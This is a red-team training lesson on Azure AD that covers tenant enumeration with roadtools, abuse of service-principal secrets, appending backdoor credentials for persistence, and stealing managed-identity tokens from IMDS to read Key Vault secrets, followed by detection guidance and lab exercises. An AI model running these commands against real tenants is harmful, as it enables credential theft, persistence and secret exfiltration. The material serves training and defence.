---
title: "Azure Red Teaming — Azure AD, Service Principals, and Managed Identities"
tags: [red-team, cloud, Azure, AzureAD, EntraID, service-principal, managed-identity,
  RBAC, token, Roadtools, AADInternals, ATT&CK, T1078.004, T1528, T1098.001]
module: 08-RedTeam-03
day: 525
related_topics:
  - AWS Exploitation Lab (Day 524)
  - Azure Attack Lab (Day 526)
  - SID History and Trust Attacks (Day 516)
  - Active Directory concepts (Days 499–520)
---

# Day 525 — Azure Red Teaming

> "Azure Active Directory is not Active Directory. It has overlapping concepts —
> users, groups, roles, tokens — but the mechanics are different, the attack
> paths are different, and the detection is different. Do not map AWS IAM onto
> it and do not map on-prem AD onto it. Understand it on its own terms. The
> privileged roles are different. The token types are different. The pivot from
> Azure AD into Azure resources is different from the pivot between domains in AD.
> Learn the model first. Then break it."
>
> — Ghost

---

## Goals

Understand the Azure AD (Microsoft Entra ID) security model and how it differs
from on-premises AD.
Enumerate Azure AD tenants, users, groups, roles, and service principals from
a compromised credential.
Understand Service Principals and Managed Identities as attack surfaces.
Map the Azure AD privilege escalation paths to their on-prem AD equivalents.

**Prerequisites:** Day 523–524 (AWS cloud red teaming), on-prem AD knowledge
(Days 499–520), OAuth 2.0 fundamentals.
**Time budget:** 5 hours.

---

## Part 1 — The Azure Identity Model

```
Azure AD (Microsoft Entra ID):
  → Cloud-only identity provider for Microsoft 365, Azure resources, and
    third-party SaaS via federated SSO
  → Analogous to on-prem AD but fundamentally different architecture:
    no Kerberos, no NTLM, no domain controllers (replaced by global cloud service)
    no LDAP (replaced by Microsoft Graph API)
    no Group Policy (replaced by Conditional Access + Intune MDM)

Identity types:
  User account:    a person's identity in the tenant
                   ↔ AD User account (same concept, different auth protocol)
  Service Principal: an identity for an application or service
                   ↔ AD service account (similar concept)
  Managed Identity: a Service Principal whose credentials are managed by Azure
                   ↔ AD gMSA (group Managed Service Account)

Token types (OAuth 2.0):
  Access Token:   short-lived JWT; grants access to a specific resource (Graph API,
                  Azure Resource Manager, etc.); typically expires in 1 hour
  Refresh Token:  long-lived token; used to get new access tokens without
                  re-authenticating; expires after 90 days of inactivity
  PRT (Primary Refresh Token): device-level token; valid for 14 days;
                  used by Windows 10/11 devices joined to Azure AD;
                  equivalent of a TGT in on-prem Kerberos

Azure RBAC (Role-Based Access Control):
  → Controls access to Azure RESOURCES (subscriptions, resource groups, VMs, etc.)
  → Separate from Azure AD roles
  → Built-in roles: Owner, Contributor, Reader, User Access Administrator
  → Owner: full control of a resource; can grant others Owner

Azure AD Roles:
  → Control actions within Azure AD (tenant-level)
  → Global Administrator: full tenant control
  → Privileged Role Administrator: can assign any Azure AD role
  → Application Administrator: full control over app registrations
  → Exchange Administrator, SharePoint Administrator, etc.
```

---

## Part 2 — Azure AD Enumeration

### From a User Account

```bash
# Install Roadtools (Python-based Azure AD enumeration framework):
pip install roadtools roadtx

# Authenticate via device code flow (user interactive):
roadtx auth --device-code --scope https://graph.microsoft.com/.default
# Opens a browser → user authenticates → roadtx gets access + refresh tokens

# Or authenticate with credentials (if MFA is not enforced):
roadtx auth \
    -u jsmith@corp.onmicrosoft.com \
    -p 'Password123' \
    --client-id d3590ed6-52b3-4102-aeff-aad2292ab01c  # Microsoft Office client

# Roadtools database dump (all tenant objects in one shot):
roadrecon gather
# → Queries Microsoft Graph for: users, groups, roles, service principals,
#   applications, devices, conditional access policies, OAuth permissions
# → Stores in local SQLite database (roadrecon.db)

# Explore the data:
roadrecon gui
# → Web UI on localhost:5000 showing all tenant objects and relationships
```

### Useful Queries After roadrecon gather

```bash
# Users with Global Administrator role:
sqlite3 roadrecon.db "SELECT userPrincipalName FROM Users u
    JOIN RoleAssignments r ON u.objectId = r.principalId
    JOIN DirectoryRoles d ON r.roleDefinitionId = d.objectId
    WHERE d.displayName = 'Global Administrator'"

# Service Principals with sensitive permissions on Microsoft Graph:
# (e.g. Mail.Read, Directory.Read.All, RoleManagement.ReadWrite.Directory)
sqlite3 roadrecon.db "SELECT sp.displayName, a.value
    FROM AppRoleAssignments a
    JOIN ServicePrincipals sp ON a.principalId = sp.objectId
    WHERE a.value LIKE '%Directory%' OR a.value LIKE '%Role%'"

# Conditional Access policies — are they enforced for all users or just some?
sqlite3 roadrecon.db "SELECT displayName, state, conditions, grantControls
    FROM ConditionalAccessPolicies WHERE state = 'enabled'"

# Azure RBAC: who is Owner on which subscription:
roadtx get-tokens --scope https://management.azure.com/.default
az role assignment list --all --include-inherited \
    --query "[?roleDefinitionName=='Owner'].{principal:principalName,scope:scope}"
```

### Using Microsoft Graph Directly

```bash
# Microsoft Graph is the REST API for Azure AD
# All roadrecon data comes from here; can also be queried directly with a token

ACCESS_TOKEN=$(cat .roadtools_auth | python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

# List all users:
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://graph.microsoft.com/v1.0/users?$select=userPrincipalName,displayName,accountEnabled"

# List all Global Admins:
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://graph.microsoft.com/v1.0/directoryRoles?$filter=displayName eq 'Global Administrator'" \
    | python3 -c "import json,sys; print(json.load(sys.stdin)['value'][0]['id'])"

GLOBALADMIN_ROLE_ID=<from above>
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://graph.microsoft.com/v1.0/directoryRoles/$GLOBALADMIN_ROLE_ID/members"

# List all application registrations and their secret/certificate expiry:
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://graph.microsoft.com/v1.0/applications?$select=displayName,passwordCredentials,keyCredentials"
# → Expired secrets/certificates are often left in place and may still work
```

---

## Part 3 — Service Principal Attacks

### What Service Principals Are

```
An Application Registration in Azure AD creates two objects:
  1. Application object (global — exists once in the directory)
  2. Service Principal (local to each tenant that installs the app)

Authentication methods for a Service Principal:
  A. Client Secret: a password string (like a service account password)
  B. Certificate:   an X.509 cert (like a smart card for the service)
  C. Federated Identity: OIDC trust with an external identity provider

Why Service Principals are high-value targets:
  → They often have powerful permissions (e.g. Mail.ReadWrite for an email app)
  → Secrets and certificates expire but are frequently left past expiry
  → Service Principal credentials are often stored in:
      - Application configuration files (web.config, app.properties)
      - CI/CD environment variables (GitHub Secrets, Azure DevOps variable groups)
      - Azure Key Vault (if you can access the Vault, you get the SP secret)
      - Hard-coded in source code (public GitHub repos)
```

### Finding and Abusing Service Principal Credentials

```bash
# Search for Azure SP credentials in environment variables (if on an Azure VM or
# container with an env that sets AZURE_CLIENT_ID + AZURE_CLIENT_SECRET):
env | grep -i "azure_client\|arm_client\|sp_\|service_principal"

# If found: authenticate as the Service Principal:
az login --service-principal \
    --username $AZURE_CLIENT_ID \
    --password $AZURE_CLIENT_SECRET \
    --tenant $AZURE_TENANT_ID

# Or with roadtx:
roadtx auth \
    --client-id $AZURE_CLIENT_ID \
    --client-secret $AZURE_CLIENT_SECRET \
    --tenant $AZURE_TENANT_ID \
    --scope https://graph.microsoft.com/.default

# What can this Service Principal do?
# Check Azure AD role assignments:
az role assignment list --assignee $AZURE_CLIENT_ID --all

# Check app role assignments on Microsoft Graph:
roadrecon gather --client-id $AZURE_CLIENT_ID --secret $AZURE_CLIENT_SECRET
```

### Adding Credentials to a Service Principal (Persistence)

```bash
# If you have Application.ReadWrite.All or Directory.ReadWrite.All:
# Add a new credential to an existing Service Principal (backdoor)

# Add a password credential to a Service Principal:
az ad sp credential reset \
    --id $SERVICE_PRINCIPAL_OBJECT_ID \
    --append \
    --credential-description "cert_renewal" \
    --years 2
# → New password issued; valid for 2 years
# → Old credentials still work (--append adds, not replaces)
# → This is the cloud equivalent of adding a password to a service account

# Detection: Azure AD audit log event "Add service principal credentials"
# Low-privilege accounts adding credentials to existing SPs is suspicious
```

---

## Part 4 — Managed Identity: IMDS in Azure

```
Managed Identity: a Service Principal whose credentials are automatically managed
by Azure. The VM/container/function never sees the credentials — they are
retrieved from the Azure Instance Metadata Service (Azure IMDS).

Azure IMDS endpoint: http://169.254.169.254/metadata/identity/oauth2/token
  → Same link-local address as AWS IMDS (same design, different API)
  → Requires header: Metadata: true
  → Returns an access token for the specified resource

Attack path:
  SSRF vulnerability → Azure IMDS → access token for Azure resource APIs
  → Use the token to access Azure AD or Azure Resource Manager
  → If the VM's Managed Identity has Contributor or higher on the subscription:
    full Azure resource control (create VMs, read Key Vaults, etc.)
```

### Stealing Azure Managed Identity Tokens

```bash
# From inside the Azure VM (shell access) or via SSRF:

# Get a token for Microsoft Graph:
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

# Get a token for Azure Resource Manager:
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use the ARM token to list resources in the subscription:
ARM_TOKEN=<from above>
curl -H "Authorization: Bearer $ARM_TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01"

# List Key Vaults the Managed Identity can access:
curl -H "Authorization: Bearer $ARM_TOKEN" \
    "https://management.azure.com/subscriptions/SUB_ID/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01"

# Read secrets from Key Vault (if the Managed Identity has Key Vault access):
KV_TOKEN=$(curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" \
    | python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

curl -H "Authorization: Bearer $KV_TOKEN" \
    "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.4"
# → Lists all secrets in the Key Vault
curl -H "Authorization: Bearer $KV_TOKEN" \
    "https://VAULT_NAME.vault.azure.net/secrets/SECRET_NAME?api-version=7.4"
# → Reads the secret value
```

---

## Part 5 — Detection

```
Azure AD audit logs (portal: Azure Active Directory → Audit Logs):
  → AddedMember to role: user added to Global Administrator
  → Add service principal credentials: new credential on a SP
  → Update application: changes to app registration

Azure Activity Log (portal: Monitor → Activity Log):
  → Microsoft.KeyVault/vaults/secrets/read: Key Vault secret access
  → Microsoft.Authorization/roleAssignments/write: RBAC role assignment
  → Microsoft.Compute/virtualMachines/runCommand/action: VM run command (lateral movement)

Azure AD Sign-In Logs:
  → Service Principal sign-ins from unusual IPs
  → Interactive sign-ins with legacy authentication protocols (no MFA)
  → Failed MFA prompts (password spray via Azure)

Sentinel detection rules (built-in):
  → "Suspicious sign-in activity" — anomalous location, ISP, or device
  → "New access credential added to application or service principal"
  → "Global Administrator role member added"
  → "Privilege Identity Management (PIM) role activation outside schedule"

Key signal: Managed Identity token used from an external IP
  → Managed Identity tokens are meant to be used from inside the VM
  → If a token acquired from IMDS is used from an IP that is NOT the VM's IP:
    this is the same signal as EC2AppRole credentials used from off-instance
  → Azure has limited native detection for this; requires custom Sentinel query
    correlating sign-in IP with VM IP in Azure metadata
```

---

## Key Takeaways

1. Azure AD roles and Azure RBAC are separate systems that must both be
   enumerated. A Global Administrator in Azure AD does not automatically have
   Owner on Azure subscriptions — and vice versa. Map both privilege planes for
   every compromised identity.
2. Service Principal client secrets are the Azure equivalent of service account
   passwords. They expire but are rarely cleaned up. A secret that expired six
   months ago may still work if the application configuration was not updated.
   Search GitHub, CI/CD systems, and config files for `AZURE_CLIENT_SECRET` and
   related patterns.
3. Managed Identity token theft via SSRF is the Azure equivalent of EC2 IMDS
   abuse. The mitigation is the same: design web applications so they cannot make
   outbound requests to 169.254.169.254. Azure has no "IMDSv2 equivalent" to
   force a pre-request token — the `Metadata: true` header is trivially added by
   most SSRF vulnerabilities.
4. Roadtools + roadrecon provides the most comprehensive Azure AD enumeration
   available without requiring Global Admin. Even a standard user can run it
   (if `Users can read all users` is the default, which it is). The local SQLite
   database can be queried with complex joins that the Azure portal does not support.
5. Azure AD Conditional Access policies are the primary MFA enforcement mechanism.
   Read and understand the CA policies before attempting any authentication attack.
   Many orgs exempt legacy authentication or specific applications — these are
   the gaps to probe first.

---

## Exercises

1. Register a free Azure AD trial tenant. Create a lab user `jsmith` with the
   User Administrator role. Run `roadrecon gather` as jsmith. Query the resulting
   SQLite database to list all users with admin roles and all Service Principals
   with Directory.ReadWrite.All permissions.
2. Enable a System-Assigned Managed Identity on a lab Azure VM. From inside the
   VM, use curl to obtain an access token for Microsoft Graph. Call the Graph API
   to list the tenant's users. What does this tell you about the Managed Identity's
   permissions?
3. Create a Service Principal with a client secret (az ad sp create-for-rbac).
   Let the secret expire (modify the expiry date in the portal to yesterday).
   Verify that the expired secret still authenticates (it does, by default, for a
   grace period). Research the Azure setting that enforces immediate secret revocation
   on expiry — is it enabled by default?
4. Write a KQL query for Microsoft Sentinel that alerts when an Azure AD sign-in
   event shows a Service Principal authenticating from an IP address that has not
   been seen for that Service Principal in the past 30 days.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q525.1, Q525.2 …).

---

## Navigation

← Previous: [Day 524 — AWS Exploitation Lab](DAY-0524-AWS-Exploitation-Lab.md)
→ Next: [Day 526 — Azure Attack Lab](DAY-0526-Azure-Attack-Lab.md)
